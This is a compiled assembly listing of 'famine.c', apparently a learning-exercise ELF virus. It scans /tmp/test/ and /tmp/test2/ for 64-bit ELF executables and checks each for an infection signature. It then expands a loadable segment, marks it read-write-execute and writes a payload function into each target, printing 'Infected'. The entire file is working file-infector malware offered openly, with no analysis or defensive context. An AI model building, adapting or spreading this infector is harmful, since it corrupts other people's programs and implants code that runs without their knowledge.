	.file	"famine.c"
	.text
	.p2align 4,,15
	.globl	check_dat_elf
	.type	check_dat_elf, @function
check_dat_elf:
.LFB29:
	.cfi_startproc
	xorl	%eax, %eax
	cmpq	$63, %rdi
	jbe	.L1
	cmpl	$1179403647, (%rsi)
	je	.L17
.L1:
	rep ret
	.p2align 4,,10
	.p2align 3
.L17:
	cmpb	$2, 4(%rsi)
	jne	.L1
	cmpb	$0, 5(%rsi)
	je	.L1
	cmpb	$1, 6(%rsi)
	jne	.L1
	movzwl	16(%rsi), %ecx
	leal	-2(%rcx), %edx
	cmpw	$1, %dx
	ja	.L1
	cmpw	$62, 18(%rsi)
	jne	.L1
	cmpq	$64, 32(%rsi)
	jne	.L1
	movzwl	56(%rsi), %ecx
	leaq	0(,%rcx,8), %rdx
	subq	%rcx, %rdx
	leaq	64(,%rdx,8), %rdx
	cmpq	%rdx, %rdi
	jb	.L1
	movq	40(%rsi), %r8
	cmpq	$63, %r8
	jbe	.L1
	movzwl	60(%rsi), %edx
	movq	%rdx, %rcx
	salq	$6, %rdx
	addq	%r8, %rdx
	cmpq	%rdx, %rdi
	jb	.L1
	cmpl	$3670080, 52(%rsi)
	jne	.L1
	cmpw	$64, 58(%rsi)
	jne	.L1
	xorl	%eax, %eax
	cmpw	62(%rsi), %cx
	seta	%al
	ret
	.cfi_endproc
.LFE29:
	.size	check_dat_elf, .-check_dat_elf
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC0:
	.string	"file: %s"
.LC1:
	.string	" sign: %#lx"
.LC2:
	.string	" -> Already Infected"
.LC3:
	.string	"OPEN file failed\n"
	.section	.rodata
.LC4:
	.string	""
	.string	""
	.section	.rodata.str1.1
.LC5:
	.string	" -> Infected"
	.text
	.p2align 4,,15
	.globl	pack_dat_elf
	.type	pack_dat_elf, @function
pack_dat_elf:
.LFB30:
	.cfi_startproc
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	movq	%rdx, %rax
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$184, %rsp
	.cfi_def_cfa_offset 240
	movzwl	56(%rdx), %ecx
	addq	32(%rdx), %rax
	testq	%rcx, %rcx
	movq	%rax, (%rsp)
	movq	%rax, %r14
	movl	$1, %eax
	jne	.L48
	jmp	.L18
	.p2align 4,,10
	.p2align 3
.L54:
	cmpq	%rcx, %rax
	jnb	.L18
	addq	$56, %r14
	addq	$1, %rax
.L48:
	cmpl	$1, (%r14)
	jne	.L54
	movq	16(%r14), %r9
	movq	24(%rdx), %r10
	cmpq	%r10, %r9
	ja	.L54
	addq	32(%r14), %r9
	cmpq	%r9, %r10
	jnb	.L54
	movslq	%esi, %rbp
	movq	%rdi, %r12
	movq	%rdi, %rsi
	leaq	.LC0(%rip), %rdi
	movq	%rdx, %rbx
	xorl	%eax, %eax
	movabsq	$4812938711839779876, %r15
	call	printf@PLT
	movq	-9(%rbx,%rbp), %r13
	leaq	.LC1(%rip), %rdi
	xorl	%eax, %eax
	movq	%r13, %rsi
	call	printf@PLT
	cmpq	%r15, %r13
	je	.L56
	leaq	32(%rsp), %rdx
	movq	%r12, %rsi
	movl	$4, %edi
	xorl	%eax, %eax
	call	syscall@PLT
	movq	%r12, %rsi
	movl	$87, %edi
	xorl	%eax, %eax
	call	syscall@PLT
	movl	56(%rsp), %ecx
	movq	%r12, %rsi
	xorl	%eax, %eax
	movl	$193, %edx
	movl	$2, %edi
	call	syscall@PLT
	cmpl	$-1, %eax
	movq	%rax, %r12
	movl	%eax, %r13d
	je	.L57
	movq	8(%r14), %rdx
	movq	32(%r14), %rcx
	movq	24(%rbx), %rax
	movl	famine64_size(%rip), %r10d
	leaq	(%rdx,%rcx), %r11
	subq	%r11, %rax
	movq	%r11, 8(%rsp)
	movq	%r11, 24(%rbx)
	movq	%rax, 16(%rsp)
	movq	64(%r14), %rax
	subq	%rdx, %rax
	subq	%rcx, %rax
	cmpq	%r10, %rax
	ja	.L29
	testq	%r10, %r10
	movq	$-1, %r15
	je	.L31
	leaq	-1(%r10), %r9
	andq	$-4096, %r9
	leaq	4096(%r9), %r10
	leaq	4095(%r9), %r15
.L31:
	movzwl	56(%rbx), %edx
	testq	%rdx, %rdx
	je	.L33
	movq	(%rsp), %rdi
	leaq	0(,%rdx,8), %rsi
	subq	%rdx, %rsi
	movq	%rdi, %rax
	leaq	8(%rdi,%rsi,8), %rsi
	addq	$8, %rax
	jmp	.L34
	.p2align 4,,10
	.p2align 3
.L58:
	movq	%rcx, %r11
	addq	8(%r14), %r11
.L34:
	movq	(%rax), %rdx
	cmpq	%r11, %rdx
	jb	.L37
	addq	%r10, %rdx
	movq	%rdx, (%rax)
.L37:
	addq	$56, %rax
	cmpq	%rsi, %rax
	jne	.L58
.L33:
	movzwl	60(%rbx), %esi
	movq	40(%rbx), %r11
	testq	%rsi, %rsi
	je	.L36
	movq	%rcx, %rdi
	addq	8(%r14), %rdi
	salq	$6, %rsi
	addq	%r11, %rsi
	leaq	(%rbx,%r11), %rax
	addq	%rbx, %rsi
	.p2align 4,,10
	.p2align 3
.L41:
	movq	24(%rax), %rdx
	cmpq	%rdi, %rdx
	jb	.L40
	addq	%r10, %rdx
	movq	%rdx, 24(%rax)
.L40:
	addq	$64, %rax
	cmpq	%rax, %rsi
	jne	.L41
.L36:
	addq	%r10, %r11
	addq	%r10, %rcx
	movq	%rbx, %rdx
	movq	%r11, 40(%rbx)
	addq	%r10, 40(%r14)
	movl	%r12d, %esi
	movq	%rcx, 32(%r14)
	movq	8(%rsp), %rcx
	movl	$1, %edi
	movl	$7, 4(%r14)
	xorl	%eax, %eax
	movq	%r10, (%rsp)
	leaq	.LC4(%rip), %r14
	call	syscall@PLT
	movl	famine64_size(%rip), %ecx
	movq	famine64_func@GOTPCREL(%rip), %rdx
	movl	%r12d, %esi
	movl	$1, %edi
	xorl	%eax, %eax
	subq	$8, %rcx
	call	syscall@PLT
	leaq	16(%rsp), %rdx
	xorl	%eax, %eax
	movl	$8, %ecx
	movl	%r12d, %esi
	movl	$1, %edi
	call	syscall@PLT
	movl	famine64_size(%rip), %eax
	movq	(%rsp), %r10
	cmpq	%rax, %r10
	ja	.L50
	jmp	.L39
	.p2align 4,,10
	.p2align 3
.L44:
	movq	%rdx, %r15
.L50:
	movq	%r14, %rdx
	xorl	%eax, %eax
	movl	$1, %ecx
	movl	%r13d, %esi
	movl	$1, %edi
	call	syscall@PLT
	movl	famine64_size(%rip), %eax
	leaq	-1(%r15), %rdx
	cmpq	%r15, %rax
	jb	.L44
.L39:
	movq	8(%rsp), %rax
	leaq	-1(%rbp), %rcx
	movl	%r12d, %esi
	movl	$1, %edi
	leaq	(%rbx,%rax), %rdx
	subq	%rax, %rcx
	xorl	%eax, %eax
	call	syscall@PLT
	movabsq	$4812938711839779876, %rax
	movq	%rax, 24(%rsp)
.L55:
	leaq	24(%rsp), %rdx
	movl	$8, %ecx
	movl	%r12d, %esi
	movl	$1, %edi
	xorl	%eax, %eax
	call	syscall@PLT
	movl	$3, %edi
	movl	%r12d, %esi
	xorl	%eax, %eax
	call	syscall@PLT
	leaq	.LC5(%rip), %rdi
	call	puts@PLT
.L18:
	addq	$184, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L57:
	.cfi_restore_state
	leaq	.LC3(%rip), %rsi
	movl	$17, %edx
	movl	$1, %edi
	call	write@PLT
	jmp	.L18
	.p2align 4,,10
	.p2align 3
.L56:
	leaq	.LC2(%rip), %rdi
	call	puts@PLT
	jmp	.L18
	.p2align 4,,10
	.p2align 3
.L29:
	addq	%r10, 40(%r14)
	addq	%r10, %rcx
	movq	%rbx, %rdx
	movq	%rcx, 32(%r14)
	movl	%r12d, %esi
	movq	%r11, %rcx
	movl	$1, %edi
	movl	$7, 4(%r14)
	xorl	%eax, %eax
	movq	%r11, (%rsp)
	call	syscall@PLT
	movl	famine64_size(%rip), %ecx
	movq	famine64_func@GOTPCREL(%rip), %rdx
	movl	%r12d, %esi
	movl	$1, %edi
	xorl	%eax, %eax
	subq	$8, %rcx
	call	syscall@PLT
	leaq	16(%rsp), %rdx
	movl	$8, %ecx
	movl	%r12d, %esi
	movl	$1, %edi
	xorl	%eax, %eax
	call	syscall@PLT
	movl	famine64_size(%rip), %eax
	movq	(%rsp), %r11
	leaq	-1(%rbp), %rcx
	movl	%r12d, %esi
	movl	$1, %edi
	addq	%rax, %r11
	xorl	%eax, %eax
	leaq	(%rbx,%r11), %rdx
	subq	%r11, %rcx
	call	syscall@PLT
	movq	%r15, 24(%rsp)
	jmp	.L55
	.cfi_endproc
.LFE30:
	.size	pack_dat_elf, .-pack_dat_elf
	.p2align 4,,15
	.globl	get_dat_elf
	.type	get_dat_elf, @function
get_dat_elf:
.LFB28:
	.cfi_startproc
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$2088, %rsp
	.cfi_def_cfa_offset 2144
	movzbl	(%rdi), %edx
	testb	%dl, %dl
	je	.L80
	leaq	31(%rsp), %r8
	movl	$1, %eax
	.p2align 4,,10
	.p2align 3
.L61:
	movb	%dl, (%r8,%rax)
	movl	%eax, %ecx
	addq	$1, %rax
	movzbl	-1(%rdi,%rax), %edx
	testb	%dl, %dl
	jne	.L61
.L60:
	movzbl	(%rsi), %edx
	testb	%dl, %dl
	je	.L98
	leaq	32(%rsp), %rbx
	movslq	%ecx, %rdi
	movl	$1, %eax
	movq	%rbx, 8(%rsp)
	addq	%rbx, %rdi
	.p2align 4,,10
	.p2align 3
.L63:
	movb	%dl, -1(%rdi,%rax)
	movl	%eax, %r8d
	addq	$1, %rax
	movzbl	-1(%rsi,%rax), %edx
	testb	%dl, %dl
	jne	.L63
	movq	8(%rsp), %rsi
	addl	%r8d, %ecx
.L62:
	movslq	%ecx, %rcx
	xorl	%eax, %eax
	movl	$2048, %edx
	movb	$0, 32(%rsp,%rcx)
	movl	$2, %edi
	xorl	%ecx, %ecx
	call	syscall@PLT
	cmpl	$-1, %eax
	movq	%rax, %rbp
	movl	%eax, %r12d
	je	.L59
	movl	%eax, %esi
	movl	$2, %ecx
	xorl	%eax, %eax
	movl	$1, %edx
	movl	$8, %edi
	call	syscall@PLT
	testl	%eax, %eax
	movq	%rax, 16(%rsp)
	jle	.L96
	subq	$8, %rsp
	.cfi_def_cfa_offset 2152
	xorl	%esi, %esi
	xorl	%eax, %eax
	pushq	$0
	.cfi_def_cfa_offset 2160
	movl	32(%rsp), %edx
	movl	$-1, %r9d
	movl	$34, %r8d
	movl	$3, %ecx
	movl	$9, %edi
	call	syscall@PLT
	movq	%rax, %r14
	cmpq	$-1, %r14
	popq	%rax
	.cfi_def_cfa_offset 2152
	popq	%rdx
	.cfi_def_cfa_offset 2144
	je	.L96
	xorl	%ecx, %ecx
	xorl	%edx, %edx
	xorl	%eax, %eax
	movl	%ebp, %esi
	movl	$8, %edi
	call	syscall@PLT
	testq	%rax, %rax
	js	.L67
	leaq	16(%r14), %rax
	leaq	1056(%rsp), %r13
	movq	%rbp, 24(%rsp)
	xorl	%r15d, %r15d
	movq	%rax, %rdi
	leaq	1072(%rsp), %rax
	movq	%r13, %rbp
	movq	%rdi, %rbx
	movq	%rax, (%rsp)
	movq	%r14, %rax
	subq	%r13, %rax
	movq	%r14, %r13
	movq	%rax, %r14
	.p2align 4,,10
	.p2align 3
.L68:
	xorl	%edi, %edi
	xorl	%eax, %eax
	movl	$1024, %ecx
	movq	%rbp, %rdx
	movl	%r12d, %esi
	call	syscall@PLT
	testl	%eax, %eax
	jle	.L99
	movslq	%r15d, %rdi
	leaq	(%rbx,%rdi), %rdx
	leaq	(%rdi,%r13), %r10
	cmpq	%rdx, %rbp
	setnb	%cl
	cmpq	%r10, (%rsp)
	setbe	%dl
	orb	%dl, %cl
	je	.L69
	cmpl	$15, %eax
	jbe	.L69
	leal	-16(%rax), %edi
	xorl	%ecx, %ecx
	xorl	%esi, %esi
	shrl	$4, %edi
	addl	$1, %edi
	movl	%edi, %edx
	sall	$4, %edx
	.p2align 4,,10
	.p2align 3
.L70:
	movdqa	0(%rbp,%rcx), %xmm0
	addl	$1, %esi
	addq	$16, %rcx
	movups	%xmm0, -16(%rcx,%r10)
	cmpl	%esi, %edi
	ja	.L70
	cmpl	%edx, %eax
	je	.L75
	movslq	%edx, %rcx
	movzbl	1056(%rsp,%rcx), %esi
	leal	(%r15,%rdx), %ecx
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	1(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	2(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	3(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	4(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	5(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	6(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	7(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	8(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	9(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	10(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	11(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	12(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	movb	%sil, 0(%r13,%rcx)
	leal	13(%rdx), %ecx
	cmpl	%ecx, %eax
	jle	.L75
	movslq	%ecx, %rsi
	addl	$14, %edx
	addl	%r15d, %ecx
	movzbl	1056(%rsp,%rsi), %esi
	movslq	%ecx, %rcx
	cmpl	%edx, %eax
	movb	%sil, 0(%r13,%rcx)
	jle	.L75
	movslq	%edx, %rcx
	addl	%r15d, %edx
	movzbl	1056(%rsp,%rcx), %ecx
	movslq	%edx, %rdx
	movb	%cl, 0(%r13,%rdx)
.L75:
	addl	%eax, %r15d
	jmp	.L68
.L96:
	movl	%ebp, %esi
	movl	$3, %edi
	xorl	%eax, %eax
	call	syscall@PLT
.L59:
	addq	$2088, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L69:
	.cfi_restore_state
	leal	-1(%rax), %edx
	leaq	1(%rbp,%rdx), %r10
	movq	%rbp, %rdx
	.p2align 4,,10
	.p2align 3
.L74:
	movzbl	(%rdx), %esi
	leaq	(%r14,%rdx), %rcx
	addq	$1, %rdx
	cmpq	%r10, %rdx
	movb	%sil, (%rcx,%rdi)
	jne	.L74
	jmp	.L75
.L99:
	movq	24(%rsp), %rbp
	movl	%eax, (%rsp)
	movl	$3, %edi
	xorl	%eax, %eax
	movq	%r13, %r14
	movl	%ebp, %esi
	call	syscall@PLT
	movl	(%rsp), %edx
	testl	%edx, %edx
	jne	.L77
	cmpl	$63, 16(%rsp)
	jle	.L77
	cmpl	$1179403647, 0(%r13)
	jne	.L77
	cmpb	$2, 4(%r13)
	je	.L100
.L77:
	movl	16(%rsp), %edx
	movq	%r14, %rsi
	movl	$11, %edi
	xorl	%eax, %eax
	call	syscall@PLT
	jmp	.L59
.L67:
	movl	%ebp, %esi
	movl	$3, %edi
	xorl	%eax, %eax
	call	syscall@PLT
	jmp	.L77
.L100:
	cmpb	$0, 5(%r13)
	je	.L77
	cmpb	$1, 6(%r13)
	jne	.L77
	movzwl	16(%r13), %eax
	subl	$2, %eax
	cmpw	$1, %ax
	ja	.L77
	cmpw	$62, 18(%r13)
	jne	.L77
	cmpq	$64, 32(%r13)
	jne	.L77
	movzwl	56(%r13), %edx
	movslq	16(%rsp), %rcx
	leaq	0(,%rdx,8), %rax
	subq	%rdx, %rax
	leaq	64(,%rax,8), %rax
	cmpq	%rax, %rcx
	jb	.L77
	movq	40(%r13), %rsi
	cmpq	$63, %rsi
	jbe	.L77
	movzwl	60(%r13), %eax
	movq	%rax, %rdx
	salq	$6, %rax
	addq	%rsi, %rax
	cmpq	%rax, %rcx
	jb	.L77
	cmpl	$3670080, 52(%r13)
	jne	.L77
	cmpw	$64, 58(%r13)
	jne	.L77
	cmpw	62(%r13), %dx
	jbe	.L77
	movl	16(%rsp), %esi
	movq	8(%rsp), %rdi
	movq	%r13, %rdx
	call	pack_dat_elf
	jmp	.L77
.L98:
	leaq	32(%rsp), %rax
	movq	%rax, 8(%rsp)
	movq	%rax, %rsi
	jmp	.L62
.L80:
	xorl	%ecx, %ecx
	jmp	.L60
	.cfi_endproc
.LFE28:
	.size	get_dat_elf, .-get_dat_elf
	.p2align 4,,15
	.globl	find_files
	.type	find_files, @function
find_files:
.LFB27:
	.cfi_startproc
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	xorl	%ecx, %ecx
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	movq	%rdi, %rsi
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	xorl	%eax, %eax
	movq	%rdi, %r12
	movl	$591872, %edx
	movl	$2, %edi
	subq	$1048, %rsp
	.cfi_def_cfa_offset 1104
	call	syscall@PLT
	cmpl	$-1, %eax
	movq	%rax, 8(%rsp)
	je	.L101
	leaq	16(%rsp), %r15
	movl	%eax, %r13d
	.p2align 4,,10
	.p2align 3
.L103:
	xorl	%eax, %eax
	movl	$1024, %ecx
	movq	%r15, %rdx
	movl	%r13d, %esi
	movl	$217, %edi
	call	syscall@PLT
	testl	%eax, %eax
	movl	%eax, %r14d
	jle	.L110
	xorl	%ebp, %ebp
	jmp	.L105
	.p2align 4,,10
	.p2align 3
.L104:
	movzwl	16(%rbx), %eax
	addl	%eax, %ebp
	cmpl	%ebp, %r14d
	jle	.L103
.L105:
	movslq	%ebp, %rbx
	addq	%r15, %rbx
	cmpb	$8, 18(%rbx)
	jne	.L104
	leaq	19(%rbx), %rsi
	movq	%r12, %rdi
	call	get_dat_elf
	jmp	.L104
.L110:
	movl	8(%rsp), %esi
	movl	$3, %edi
	xorl	%eax, %eax
	call	syscall@PLT
.L101:
	addq	$1048, %rsp
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE27:
	.size	find_files, .-find_files
	.section	.rodata.str1.1
.LC6:
	.string	"/tmp/test/"
.LC7:
	.string	"/tmp/test2/"
	.section	.text.startup,"ax",@progbits
	.p2align 4,,15
	.globl	main
	.type	main, @function
main:
.LFB26:
	.cfi_startproc
	pushq	%rbx
	.cfi_def_cfa_offset 16
	.cfi_offset 3, -16
	leaq	.LC6(%rip), %rdi
	leaq	.LC7(%rip), %rax
	subq	$32, %rsp
	.cfi_def_cfa_offset 48
	movq	%rdi, (%rsp)
	movq	%rax, 8(%rsp)
	movq	%rsp, %rbx
	movq	$0, 16(%rsp)
.L112:
	addq	$8, %rbx
	call	find_files
	movq	(%rbx), %rdi
	testq	%rdi, %rdi
	jne	.L112
	addq	$32, %rsp
	.cfi_def_cfa_offset 16
	xorl	%eax, %eax
	popq	%rbx
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE26:
	.size	main, .-main
	.text
	.p2align 4,,15
	.globl	dat_elf_is_infected
	.type	dat_elf_is_infected, @function
dat_elf_is_infected:
.LFB31:
	.cfi_startproc
	movslq	%esi, %rsi
	pushq	%rbx
	.cfi_def_cfa_offset 16
	.cfi_offset 3, -16
	xorl	%eax, %eax
	movq	-9(%rdi,%rsi), %rbx
	leaq	.LC1(%rip), %rdi
	movq	%rbx, %rsi
	call	printf@PLT
	movabsq	$4812938711839779876, %rax
	cmpq	%rax, %rbx
	sete	%al
	movzbl	%al, %eax
	popq	%rbx
	.cfi_def_cfa_offset 8
	ret
	.cfi_endproc
.LFE31:
	.size	dat_elf_is_infected, .-dat_elf_is_infected
	.ident	"GCC: (Debian 6.3.0-18+deb9u1) 6.3.0 20170516"
	.section	.note.GNU-stack,"",@progbits
